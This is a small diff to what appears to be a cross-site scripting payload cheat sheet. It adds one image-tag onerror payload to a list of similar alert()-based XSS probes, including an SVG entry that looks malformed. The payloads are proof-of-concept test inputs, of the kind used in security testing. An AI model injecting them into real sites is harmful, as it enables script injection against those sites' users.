@@ -250,6 +250,7 @@ Most tools are also suitable for blind XSS attacks:
 <img src=x:alert(alt) onerror=eval(src) alt=xss>
 "><img src=x onerror=alert('XSS');>
 "><img src=x onerror=alert(String.fromCharCode(88,83,83));>
+<><img src=1 onerror=alert(1)>
 
 // Svg payload
 <svgonload=alert(1)>
